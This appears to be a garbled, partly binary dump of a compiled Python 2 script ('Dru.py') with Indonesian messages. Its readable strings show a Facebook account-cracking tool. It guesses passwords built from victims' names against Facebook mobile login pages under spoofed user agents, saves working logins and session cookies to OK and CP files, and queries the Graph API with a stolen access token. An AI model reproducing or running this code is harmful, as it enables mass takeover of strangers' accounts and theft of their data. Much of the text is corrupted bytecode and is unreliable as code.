s                           i   (   R,   RQ   R/   R    R!   R"   R�   Rx   RT   R�   R�   R#   R�   R�   RB   R�   Rw   R*   R�   RC   RJ   Rv   R�   RH   RL   RI   R�   R.   (   R�   R1   R�   R�   RS   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/Dru.pyR�   3  sj    
2!tE$

---	$
i   s   

[1;97m [#] crack selesai...(   R�   R    R�   RT   RE   (   R�   RF   (    (    s   /sdcard/Dru.pyR�   -  s    			Bc          C   sQ   d t  GHd t  GHd GHd GHd �  }  t d � } | j |  t � d GHt �  d  S(   Ns'   
 [+] hasil OK disimpan ke -> OK/%s.txts&    [+] hasil CP disimpan ke -> CP/%s.txtsB   
 [!] anda bisa menjeda proses crack dengan mematikan data selulerR4   c      	   S   s�  y t  d d � j �  } Wn t k
 r2 d } n Xg  } t j j d t t t � t t	 � t t
 � f � t j j �  |  j d � \ } } t | � d k r� | | d | d | d	 g } n�t | � d
 k r� | d | d | d	 g } n= t | � d k r| d | d	 g } n | d | d	 g } yVxE| D]=} | j �  } t j d d i | d 6| d 6d d 6d i | d 6�} | j } d | k s�d | k r�d | d | d GHt	 j | d | � t  d t d � j d | | f � Pq7n  d | k r7y� t  d � j �  a t j d | d t � } t j | j � }	 |	 d }
 |
 j d  � \ } } } t | } d! | d | d | d" | d" | d" GHt
 j | d | d | d" | d" | � t  d# t d � j d$ | | | | | f � PWn# t t f k
 rd" }
 n n Xd! | d | d% GHt
 j | d | � t  d# t d � j d | | f � Pq7q7q7Wt d& 7a Wn n Xd  S('   Ns	   ugent.txtRA   sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s+    [1;97m[*] [crack] %s/%s OK-:%s - CP-:%s Rt   i   R�   R�   R�   i   i   s%   https://mbasic.facebook.com/login.phpRr   R�   R�   R�   R�   R�   s
   user-agentR�   s   save-devices   [1;92m  * --> s           s	   OK/%s.txtRN   s     * --> %s|%s
R�   s	   login.txts   https://graph.facebook.com/s   /?access_token=R�   R�   s   [1;93m  * --> Rs   s	   CP/%s.txts     * --> %s|%s|%s %s %s
s                           i   (   R,   RQ   R/   R    R!   R"   R�   Rx   RT   R�   R�   R#   R�   R�   RB   RR   R�   Rv   R�   RL   RC   RH   RI   RJ   R�   R.   (   R�   R1   R�   R�   RS   R�   R�   R�   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/Dru.pyR�   �  sd    
2!7	$

---	$
i   s   

[1;97m [#] crack selesai...(   R�   R    R�   RT   RE   (   R�   RF   (    (    s   /sdcard/Dru.pyR�   {  s    			?c          C   sQ   d t  GHd t  GHd GHd GHd �  }  t d � } | j |  t � d GHt �  d  S(   Ns'   
 [+] hasil OK disimpan ke -> OK/%s.txts&    [+] hasil CP disimpan ke -> CP/%s.txtsB   
 [!] anda bisa menjeda proses crack dengan mematikan data selulerR4   c      	   S   s  y t  d d � j �  } Wn t k
 r2 d } n Xg  } t j j d t t t � t t	 � t t
 � f � t j j �  |  j d � \ } } t | � d k r� | | d | d | d	 g } n>t | � d
 k r� | d | d | d	 g } n= t | � d k r| d | d	 g } n | d | d	 g } y�x�| D]�} | j �  } t j �  } | j j i d d 6d d 6d d 6| d 6d d 6d d 6d d 6� | j d � } | j d d i | d 6| d 6d d 6�} d  | j j �  j �  k r�d! j g  | j j �  j �  D] \ }	 }
 d" |	 |
 f ^ q� } d# t | | | t f GHd$ | | | f } t	 j | � t  d% t d& � j d' | � Pq7q7d( | j j �  j �  k r7y� t  d) � j �  a t j d* | d+ t � } t j | j  � } | d, } | j d- � \ } } } t! | } d. t" | | | | | t f GHd/ | | | | | f } t
 j | � t  d0 t d& � j d' | � PWn# t# t f k
 r�d1 } n n Xd2 t" | | t f GHd3 | | f } t  d0 t d& � j d' | � Pq7q7q7Wt d4 7a Wn n Xd  S(5   Ns	   ugent.txtRA   sz   Mozilla/5.0 (Series40; NokiaX2-02/10.90; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/1.0.2.26.11s+    [1;97m[*] [crack] %s/%s OK-:%s - CP-:%s Rt   i   R�   R�   R�   i   i   s   m.facebook.comR�   s	   max-age=0s   cache-controlRW   s   upgrade-insecure-requestss
   user-agentsU   text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8R�   s   gzip, deflates   accept-encodings#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   accept-languages   https://m.facebook.coms    https://m.facebook.com/login.phpRr   R�   R�   R�   R�   R�   R�   s   %s=%ss&     %s* --> %s|%s|%s                 %ss     * --> %s|%s|%ss	   OK/%s.txtRN   s   %s
R�   s	   login.txts   https://graph.facebook.com/s   /?access_token=R�   R�   s      %s* --> %s|%s|%s %s %s     %ss     * --> %s|%s|%s %s %ss	   CP/%s.txtRs   s"     %s* --> %s|%s                %ss     * --> %s|%si   ($   R,   RQ   R/   R    R!   R"   R�   Rx   RT   R�   R�   R#   R�   R�   RB   R�   R�   R�   RC   RR   R�   R�   R�   R�   R�   Ra   R�   Rv   R�   RL   RH   RI   RJ   R�   R�   R.   (   R�   R1   R�   R�   RS   R�   R�   RF   R�   R�   R�   R�   R�   R�   R�   R�   R�   R�   (    (    s   /sdcard/Dru.pyR�   �  sn    
2!A*A

	
i   s   

[1;97m [#] crack selesai...(   R�   R    R�   RT   RE   (   R�   RF   (    (    s   /sdcard/Dru.pyR�   �  s    			Dc           C   s:   y t  j d � Wn n Xy t  j d � Wn n Xd  S(   NR�   R�   (   R9   R�   (    (    (    s   /sdcard/Dru.pyt   buat_folder  s    t   __main__s   git pull(o   R9   R    R$   R   R*   t   hashlibt   ret	   threadingRH   t   urllibt	   cookielibRB   t   uuidt   calendart   multiprocessing.poolR    t   bs4R   t   parsert   concurrent.futuresR   t   requests.exceptionsR   R   t   PR�   Ra   R�   t   Bt   Ut   OR�   RF   t   kRc   t   dt   hR�   t   jRN   t   ImportErrorR:   t   reloadt   setdefaultencodingRC   RJ   Rb   R�   t   st   fbR�   RT   R�   R�   R�   t   nowt   ctR�   t   nt   bulan1RE   t   nTempt
   ValueErrort   currentR�   t   tat   buR�   t   hat   opt   todayt   my_datet   day_namet   weekdayt   hrR�   R`   R�   R(   R3   R=   R@   RP   RK   R<   Rk   Rd   Rh   Re   Rf   Rg   Ri   Rj   Rn   Ro   Rp   R�   Ry   R�   R�   R�   R�   R�   R�   R1   t   reeR�   R�   R�   R�   t   __name__(    (    (    s   /sdcard/Dru.pyt   <module>   s�   �
		
			


					"		K								,	6								G	D	I	7	N	K	P	